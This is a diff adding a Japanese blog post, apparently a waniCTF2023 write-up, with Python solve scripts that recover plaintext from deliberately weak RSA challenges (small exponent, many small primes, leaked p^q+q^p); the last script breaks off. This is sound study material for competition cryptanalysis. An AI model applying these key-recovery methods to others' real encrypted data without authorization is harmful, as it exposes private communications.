@@ -1,0 +1,477 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>waniCTF2023 // お茶は綾鷹派</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.117.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="KoheiDoi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.3fb9065bb18f896621f7ce2fad5bbbafdf9954fbe571b5e41c6e59a8cbacc8ef.css" />
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="waniCTF2023"/>
+<meta name="twitter:description" content="初心者~中級者の CTF ．個人参加．beginner は全解きしたいのきもちで挑んだが分かりやすい問題が多くて色んな技術にスムーズに入門することができた． これを機に CTF 入門していきたいきもち
+waniCTF2023
+official writeup
+crypto EZDORSA_Lv1 ChatGPT に入れたらできた．すげえ～
+EZDORSA_Lv2 e が小さいので RSA の運用的にまずい．RSA の暗号化において $C=M^e\mod N$ だが，ここで $e$ が小さいと $M^e$ も小さくなる． このとき $M &lt; \sqrt[e]{N}$ なら，$M^e &lt; N$ より $\mod N$が関係なくなる． すると $C=M^e$ になるので，$M = \sqrt[e]{C}$ でもとまる
+import gmpy2 from Crypto.Util.number import * # 提供されたoutput.txtの内容 n = 25465155563758206895066841861765043433123515683929678836771513150236561026403556218533356199716126886534636140138011492220383199259698843686404371838391552265338889731646514381163372557117810929108511770402714925176885202763093259342499269455170147345039944516036024012941454077732406677284099700251496952610206410882558915139338028865987662513205888226312662854651278789627761068396974718364971326708407660719074895819282719926846208152543027213930660768288888225218585766787196064375064791353928495547610416240104448796600658154887110324794829898687050358437213471256328628898047810990674288648843902560125175884381 e = 7 c = 25698620825203955726406636922651025698352297732240406264195352419509234001004314759538513429877629840120788601561708588875481322614217122171252931383755532418804613411060596533561164202974971066750469395973334342059753025595923003869173026000225212644208274792300263293810627008900461621613776905408937385021630685411263655118479604274100095236252655616342234938221521847275384288728127863512191256713582669212904042760962348375314008470370142418921777238693948675063438713550567626953125 tmp = pow(5, 100, n) c = c // tmp print(tmp) print(c) m,result = gmpy2."/>
+
+    <meta property="og:title" content="waniCTF2023" />
+<meta property="og:description" content="初心者~中級者の CTF ．個人参加．beginner は全解きしたいのきもちで挑んだが分かりやすい問題が多くて色んな技術にスムーズに入門することができた． これを機に CTF 入門していきたいきもち
+waniCTF2023
+official writeup
+crypto EZDORSA_Lv1 ChatGPT に入れたらできた．すげえ～
+EZDORSA_Lv2 e が小さいので RSA の運用的にまずい．RSA の暗号化において $C=M^e\mod N$ だが，ここで $e$ が小さいと $M^e$ も小さくなる． このとき $M &lt; \sqrt[e]{N}$ なら，$M^e &lt; N$ より $\mod N$が関係なくなる． すると $C=M^e$ になるので，$M = \sqrt[e]{C}$ でもとまる
+import gmpy2 from Crypto.Util.number import * # 提供されたoutput.txtの内容 n = 25465155563758206895066841861765043433123515683929678836771513150236561026403556218533356199716126886534636140138011492220383199259698843686404371838391552265338889731646514381163372557117810929108511770402714925176885202763093259342499269455170147345039944516036024012941454077732406677284099700251496952610206410882558915139338028865987662513205888226312662854651278789627761068396974718364971326708407660719074895819282719926846208152543027213930660768288888225218585766787196064375064791353928495547610416240104448796600658154887110324794829898687050358437213471256328628898047810990674288648843902560125175884381 e = 7 c = 25698620825203955726406636922651025698352297732240406264195352419509234001004314759538513429877629840120788601561708588875481322614217122171252931383755532418804613411060596533561164202974971066750469395973334342059753025595923003869173026000225212644208274792300263293810627008900461621613776905408937385021630685411263655118479604274100095236252655616342234938221521847275384288728127863512191256713582669212904042760962348375314008470370142418921777238693948675063438713550567626953125 tmp = pow(5, 100, n) c = c // tmp print(tmp) print(c) m,result = gmpy2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://side-realms.github.io/writeup/wanictf2023/" /><meta property="article:section" content="writeup" />
+<meta property="article:published_time" content="2023-08-28T17:57:25+09:00" />
+<meta property="article:modified_time" content="2023-08-28T17:57:25+09:00" />
+
+    <style>
+      .hr1 {
+  position: relative;
+	height: 3px;
+	border-width: 0;
+	background-color: #00bcd4;
+	background-image: -webkit-linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+	background-image: linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+}
+    </style>
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://side-realms.github.io"><img class="app-header-avatar" src="/images/avatar.jpg" alt="KoheiDoi" /></a>
+      <span class="app-header-title">お茶は綾鷹派</span>
+      <p>最近は颯も好き</p>
+      <nav class="app-header-menu">
+          <font size="5">
+          <a class="app-header-menu-item" href="/">Home</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="/log/">log</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <nav class="app-header-menu">
+          <font size="4">
+          <a class="app-header-menu-item" href="/sound">sound</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="/container">container</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="/writeup">writeup</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="/other">other</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <div class="app-header-social">
+        
+          <a href="https://github.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+      </div>
+      <div class="app-footer-copyright">
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">waniCTF2023</h1>
+      </style>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 28, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          6 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>初心者~中級者の CTF ．個人参加．beginner は全解きしたいのきもちで挑んだが分かりやすい問題が多くて色んな技術にスムーズに入門することができた．
+これを機に CTF 入門していきたいきもち<br>
+<a href="https://wanictf.org/">waniCTF2023</a><br>
+<a href="https://github.com/wani-hackase/wanictf2023-writeup">official writeup</a></p>
+<h2 id="crypto">crypto</h2>
+<h3 id="ezdorsa_lv1">EZDORSA_Lv1</h3>
+<p>ChatGPT に入れたらできた．すげえ～</p>
+<h3 id="ezdorsa_lv2">EZDORSA_Lv2</h3>
+<p>e が小さいので RSA の運用的にまずい．RSA の暗号化において $C=M^e\mod N$ だが，ここで $e$ が小さいと
+$M^e$ も小さくなる．
+このとき $M &lt; \sqrt[e]{N}$ なら，$M^e &lt; N$ より $\mod N$が関係なくなる．
+すると $C=M^e$ になるので，$M = \sqrt[e]{C}$ でもとまる</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 提供されたoutput.txtの内容</span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">25465155563758206895066841861765043433123515683929678836771513150236561026403556218533356199716126886534636140138011492220383199259698843686404371838391552265338889731646514381163372557117810929108511770402714925176885202763093259342499269455170147345039944516036024012941454077732406677284099700251496952610206410882558915139338028865987662513205888226312662854651278789627761068396974718364971326708407660719074895819282719926846208152543027213930660768288888225218585766787196064375064791353928495547610416240104448796600658154887110324794829898687050358437213471256328628898047810990674288648843902560125175884381</span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">25698620825203955726406636922651025698352297732240406264195352419509234001004314759538513429877629840120788601561708588875481322614217122171252931383755532418804613411060596533561164202974971066750469395973334342059753025595923003869173026000225212644208274792300263293810627008900461621613776905408937385021630685411263655118479604274100095236252655616342234938221521847275384288728127863512191256713582669212904042760962348375314008470370142418921777238693948675063438713550567626953125</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tmp <span style="color:#f92672">=</span> pow(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">100</span>, n)
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> c <span style="color:#f92672">//</span> tmp
+</span></span><span style="display:flex;"><span>print(tmp)
+</span></span><span style="display:flex;"><span>print(c)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>m,result <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>iroot(c,e)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(m)
+</span></span><span style="display:flex;"><span>print(long_to_bytes(int(m)))
+</span></span></code></pre></div><h3 id="ezdorsa_lv3">EZDORSA_Lv3</h3>
+<p>n はせいぜい 25 bit の素数同士の積なので素因数分解ができる</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>factor(<span style="color:#ae81ff">22853745492099501680331664851090320356693194409008912025285744113835548896248217185831291330674631560895489397035632880512495471869393924928607517703027867997952256338572057344701745432226462452353867866296639971341288543996228186264749237402695216818617849365772782382922244491233481888238637900175603398017437566222189935795252157020184127789181937056800379848056404436489263973129205961926308919968863129747209990332443435222720181603813970833927388815341855668346125633604430285047377051152115484994149044131179539756676817864797135547696579371951953180363238381472700874666975466580602256195404619923451450273257882787750175913048168063212919624027302498230648845775927955852432398205465850252125246910345918941770675939776107116419037</span>)
+</span></span></code></pre></div><p>単純に複数の素数からなる RSA になるので，復号すればいい</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> math <span style="color:#f92672">import</span> gcd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> reduce
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">22853745492099501680331664851090320356693194409008912025285744113835548896248217185831291330674631560895489397035632880512495471869393924928607517703027867997952256338572057344701745432226462452353867866296639971341288543996228186264749237402695216818617849365772782382922244491233481888238637900175603398017437566222189935795252157020184127789181937056800379848056404436489263973129205961926308919968863129747209990332443435222720181603813970833927388815341855668346125633604430285047377051152115484994149044131179539756676817864797135547696579371951953180363238381472700874666975466580602256195404619923451450273257882787750175913048168063212919624027302498230648845775927955852432398205465850252125246910345918941770675939776107116419037</span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">1357660325421905236173040941411359338802736250800006453031581109522066541737601274287649030380468751950238635436299480021037135774086215029644430055129816920963535754048879496768378328297643616038615858752932646595502076461279037451286883763676521826626519164192498162380913887982222099942381717597401448235443261041226997589294010823575492744373719750855298498634721551685392041038543683791451582869246173665336693939707987213605159100603271763053357945861234455083292258819529224561475560233877987367901524658639475366193596173475396592940122909195266605662802525380504108772561699333131036953048249731269239187358174358868432968163122096583278089556057323541680931742580937874598712243278738519121974022211539212142588629508573342020495</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>a_array<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>n_array<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>divisors <span style="color:#f92672">=</span> [<span style="color:#ae81ff">16969003</span>, <span style="color:#ae81ff">17009203</span>, <span style="color:#ae81ff">17027027</span>, <span style="color:#ae81ff">17045117</span>, <span style="color:#ae81ff">17137009</span>, <span style="color:#ae81ff">17151529</span>, <span style="color:#ae81ff">17495507</span>, <span style="color:#ae81ff">17685739</span>, <span style="color:#ae81ff">17933647</span>, <span style="color:#ae81ff">18206689</span>, <span style="color:#ae81ff">18230213</span>, <span style="color:#ae81ff">18505933</span>, <span style="color:#ae81ff">18613019</span>, <span style="color:#ae81ff">18868781</span>, <span style="color:#ae81ff">18901951</span>, <span style="color:#ae81ff">18947729</span>, <span style="color:#ae81ff">19022077</span>, <span style="color:#ae81ff">19148609</span>, <span style="color:#ae81ff">19574987</span>, <span style="color:#ae81ff">19803209</span>, <span style="color:#ae81ff">20590697</span>, <span style="color:#ae81ff">20690983</span>, <span style="color:#ae81ff">21425317</span>, <span style="color:#ae81ff">21499631</span>, <span style="color:#ae81ff">21580043</span>, <span style="color:#ae81ff">21622099</span>, <span style="color:#ae81ff">21707797</span>, <span style="color:#ae81ff">21781139</span>, <span style="color:#ae81ff">21792359</span>, <span style="color:#ae81ff">21982481</span>, <span style="color:#ae81ff">22101437</span>, <span style="color:#ae81ff">22367311</span>, <span style="color:#ae81ff">22374509</span>, <span style="color:#ae81ff">22407799</span>, <span style="color:#ae81ff">22491913</span>, <span style="color:#ae81ff">22537409</span>, <span style="color:#ae81ff">22542229</span>, <span style="color:#ae81ff">22550677</span>, <span style="color:#ae81ff">22733041</span>, <span style="color:#ae81ff">23033441</span>, <span style="color:#ae81ff">23049673</span>, <span style="color:#ae81ff">23083759</span>, <span style="color:#ae81ff">23179243</span>, <span style="color:#ae81ff">23342663</span>, <span style="color:#ae81ff">23563571</span>, <span style="color:#ae81ff">23611043</span>, <span style="color:#ae81ff">23869933</span>, <span style="color:#ae81ff">24027973</span>, <span style="color:#ae81ff">24089029</span>, <span style="color:#ae81ff">24436597</span>, <span style="color:#ae81ff">24454291</span>, <span style="color:#ae81ff">24468209</span>, <span style="color:#ae81ff">24848633</span>, <span style="color:#ae81ff">25564219</span>, <span style="color:#ae81ff">25888721</span>, <span style="color:#ae81ff">26055889</span>, <span style="color:#ae81ff">26119147</span>, <span style="color:#ae81ff">26839909</span>, <span style="color:#ae81ff">27152267</span>, <span style="color:#ae81ff">27304777</span>, <span style="color:#ae81ff">27316717</span>, <span style="color:#ae81ff">27491137</span>, <span style="color:#ae81ff">27647687</span>, <span style="color:#ae81ff">27801167</span>, <span style="color:#ae81ff">28082749</span>, <span style="color:#ae81ff">28103563</span>, <span style="color:#ae81ff">28151399</span>, <span style="color:#ae81ff">28620611</span>, <span style="color:#ae81ff">29035709</span>, <span style="color:#ae81ff">29738689</span>, <span style="color:#ae81ff">29891363</span>, <span style="color:#ae81ff">29979379</span>, <span style="color:#ae81ff">30007841</span>, <span style="color:#ae81ff">30013391</span>, <span style="color:#ae81ff">30049171</span>, <span style="color:#ae81ff">30162343</span>, <span style="color:#ae81ff">30419063</span>, <span style="color:#ae81ff">30461393</span>, <span style="color:#ae81ff">30625601</span>, <span style="color:#ae81ff">31004861</span>, <span style="color:#ae81ff">31108043</span>, <span style="color:#ae81ff">31123457</span>, <span style="color:#ae81ff">31269479</span>, <span style="color:#ae81ff">31384663</span>, <span style="color:#ae81ff">31387957</span>, <span style="color:#ae81ff">31390189</span>, <span style="color:#ae81ff">31469279</span>, <span style="color:#ae81ff">32307589</span>, <span style="color:#ae81ff">32432339</span>, <span style="color:#ae81ff">32514061</span>, <span style="color:#ae81ff">32628367</span>, <span style="color:#ae81ff">32687509</span>, <span style="color:#ae81ff">32703337</span>, <span style="color:#ae81ff">32709977</span>, <span style="color:#ae81ff">32715343</span>, <span style="color:#ae81ff">32737429</span>, <span style="color:#ae81ff">32831261</span>, <span style="color:#ae81ff">33388603</span>, <span style="color:#ae81ff">33418129</span>, <span style="color:#ae81ff">33472771</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mul_inv</span>(a, b):
+</span></span><span style="display:flex;"><span>    b0 <span style="color:#f92672">=</span> b
+</span></span><span style="display:flex;"><span>    x0, x1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> b <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> a <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        q <span style="color:#f92672">=</span> a <span style="color:#f92672">//</span> b
+</span></span><span style="display:flex;"><span>        a, b <span style="color:#f92672">=</span> b, a<span style="color:#f92672">%</span>b
+</span></span><span style="display:flex;"><span>        x0, x1 <span style="color:#f92672">=</span> x1 <span style="color:#f92672">-</span> q <span style="color:#f92672">*</span> x0, x0
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> x1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>: x1 <span style="color:#f92672">+=</span> b0
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">CRT</span>(n, a):
+</span></span><span style="display:flex;"><span>    sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    prod <span style="color:#f92672">=</span> reduce(<span style="color:#66d9ef">lambda</span> a, b: a<span style="color:#f92672">*</span>b, n)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ni, ai <span style="color:#f92672">in</span> zip(n,a):
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">=</span>prod <span style="color:#f92672">//</span> ni
+</span></span><span style="display:flex;"><span>        sum <span style="color:#f92672">+=</span> ai <span style="color:#f92672">*</span> mul_inv(p, ni) <span style="color:#f92672">*</span> p
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sum <span style="color:#f92672">%</span> prod
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> divisors:
+</span></span><span style="display:flex;"><span>    phi <span style="color:#f92672">=</span> p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    d <span style="color:#f92672">=</span> mul_inv(e, phi)
+</span></span><span style="display:flex;"><span>    mk <span style="color:#f92672">=</span> pow(c, d, p)
+</span></span><span style="display:flex;"><span>    n_array<span style="color:#f92672">.</span>append(p)
+</span></span><span style="display:flex;"><span>    a_array<span style="color:#f92672">.</span>append(mk)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(n_array)
+</span></span><span style="display:flex;"><span>print(a_array)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> CRT(n_array, a_array)
+</span></span><span style="display:flex;"><span>print(long_to_bytes(int(m)))
+</span></span></code></pre></div><p>こんな CRT とかしなくても素朴に実装すればいいらしい</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> math <span style="color:#f92672">import</span> gcd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> reduce
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">22853745492099501680331664851090320356693194409008912025285744113835548896248217185831291330674631560895489397035632880512495471869393924928607517703027867997952256338572057344701745432226462452353867866296639971341288543996228186264749237402695216818617849365772782382922244491233481888238637900175603398017437566222189935795252157020184127789181937056800379848056404436489263973129205961926308919968863129747209990332443435222720181603813970833927388815341855668346125633604430285047377051152115484994149044131179539756676817864797135547696579371951953180363238381472700874666975466580602256195404619923451450273257882787750175913048168063212919624027302498230648845775927955852432398205465850252125246910345918941770675939776107116419037</span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">1357660325421905236173040941411359338802736250800006453031581109522066541737601274287649030380468751950238635436299480021037135774086215029644430055129816920963535754048879496768378328297643616038615858752932646595502076461279037451286883763676521826626519164192498162380913887982222099942381717597401448235443261041226997589294010823575492744373719750855298498634721551685392041038543683791451582869246173665336693939707987213605159100603271763053357945861234455083292258819529224561475560233877987367901524658639475366193596173475396592940122909195266605662802525380504108772561699333131036953048249731269239187358174358868432968163122096583278089556057323541680931742580937874598712243278738519121974022211539212142588629508573342020495</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>a_array<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>n_array<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span>divisors <span style="color:#f92672">=</span> [<span style="color:#ae81ff">16969003</span>, <span style="color:#ae81ff">17009203</span>, <span style="color:#ae81ff">17027027</span>, <span style="color:#ae81ff">17045117</span>, <span style="color:#ae81ff">17137009</span>, <span style="color:#ae81ff">17151529</span>, <span style="color:#ae81ff">17495507</span>, <span style="color:#ae81ff">17685739</span>, <span style="color:#ae81ff">17933647</span>, <span style="color:#ae81ff">18206689</span>, <span style="color:#ae81ff">18230213</span>, <span style="color:#ae81ff">18505933</span>, <span style="color:#ae81ff">18613019</span>, <span style="color:#ae81ff">18868781</span>, <span style="color:#ae81ff">18901951</span>, <span style="color:#ae81ff">18947729</span>, <span style="color:#ae81ff">19022077</span>, <span style="color:#ae81ff">19148609</span>, <span style="color:#ae81ff">19574987</span>, <span style="color:#ae81ff">19803209</span>, <span style="color:#ae81ff">20590697</span>, <span style="color:#ae81ff">20690983</span>, <span style="color:#ae81ff">21425317</span>, <span style="color:#ae81ff">21499631</span>, <span style="color:#ae81ff">21580043</span>, <span style="color:#ae81ff">21622099</span>, <span style="color:#ae81ff">21707797</span>, <span style="color:#ae81ff">21781139</span>, <span style="color:#ae81ff">21792359</span>, <span style="color:#ae81ff">21982481</span>, <span style="color:#ae81ff">22101437</span>, <span style="color:#ae81ff">22367311</span>, <span style="color:#ae81ff">22374509</span>, <span style="color:#ae81ff">22407799</span>, <span style="color:#ae81ff">22491913</span>, <span style="color:#ae81ff">22537409</span>, <span style="color:#ae81ff">22542229</span>, <span style="color:#ae81ff">22550677</span>, <span style="color:#ae81ff">22733041</span>, <span style="color:#ae81ff">23033441</span>, <span style="color:#ae81ff">23049673</span>, <span style="color:#ae81ff">23083759</span>, <span style="color:#ae81ff">23179243</span>, <span style="color:#ae81ff">23342663</span>, <span style="color:#ae81ff">23563571</span>, <span style="color:#ae81ff">23611043</span>, <span style="color:#ae81ff">23869933</span>, <span style="color:#ae81ff">24027973</span>, <span style="color:#ae81ff">24089029</span>, <span style="color:#ae81ff">24436597</span>, <span style="color:#ae81ff">24454291</span>, <span style="color:#ae81ff">24468209</span>, <span style="color:#ae81ff">24848633</span>, <span style="color:#ae81ff">25564219</span>, <span style="color:#ae81ff">25888721</span>, <span style="color:#ae81ff">26055889</span>, <span style="color:#ae81ff">26119147</span>, <span style="color:#ae81ff">26839909</span>, <span style="color:#ae81ff">27152267</span>, <span style="color:#ae81ff">27304777</span>, <span style="color:#ae81ff">27316717</span>, <span style="color:#ae81ff">27491137</span>, <span style="color:#ae81ff">27647687</span>, <span style="color:#ae81ff">27801167</span>, <span style="color:#ae81ff">28082749</span>, <span style="color:#ae81ff">28103563</span>, <span style="color:#ae81ff">28151399</span>, <span style="color:#ae81ff">28620611</span>, <span style="color:#ae81ff">29035709</span>, <span style="color:#ae81ff">29738689</span>, <span style="color:#ae81ff">29891363</span>, <span style="color:#ae81ff">29979379</span>, <span style="color:#ae81ff">30007841</span>, <span style="color:#ae81ff">30013391</span>, <span style="color:#ae81ff">30049171</span>, <span style="color:#ae81ff">30162343</span>, <span style="color:#ae81ff">30419063</span>, <span style="color:#ae81ff">30461393</span>, <span style="color:#ae81ff">30625601</span>, <span style="color:#ae81ff">31004861</span>, <span style="color:#ae81ff">31108043</span>, <span style="color:#ae81ff">31123457</span>, <span style="color:#ae81ff">31269479</span>, <span style="color:#ae81ff">31384663</span>, <span style="color:#ae81ff">31387957</span>, <span style="color:#ae81ff">31390189</span>, <span style="color:#ae81ff">31469279</span>, <span style="color:#ae81ff">32307589</span>, <span style="color:#ae81ff">32432339</span>, <span style="color:#ae81ff">32514061</span>, <span style="color:#ae81ff">32628367</span>, <span style="color:#ae81ff">32687509</span>, <span style="color:#ae81ff">32703337</span>, <span style="color:#ae81ff">32709977</span>, <span style="color:#ae81ff">32715343</span>, <span style="color:#ae81ff">32737429</span>, <span style="color:#ae81ff">32831261</span>, <span style="color:#ae81ff">33388603</span>, <span style="color:#ae81ff">33418129</span>, <span style="color:#ae81ff">33472771</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> divisors:
+</span></span><span style="display:flex;"><span>    phi <span style="color:#f92672">*=</span> (i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> pow(e, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, phi)
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> pow(c, d, n)
+</span></span><span style="display:flex;"><span>print(long_to_bytes(int(m)))
+</span></span></code></pre></div><h3 id="pqqp">pqqp</h3>
+<p>$s=p^q + q^p mod n$ がリークしているので，これから RSA を復号しようみたいな問題．</p>
+<p>$$ s = p^q + q^p mod n $$
+$$ s = p^q + q^p + kn = p^q + q^p + k(pq) $$
+フェルマーの小定理を使う
+$$ s = q^p \mod q = p \mod q  $$
+$$ s = p^q \mod p = q \mod p  $$
+$$ s = p+q \mod pq $$
+よって $s=p+q, n=pq$ で $p, q$ を知れればいい．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sympy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
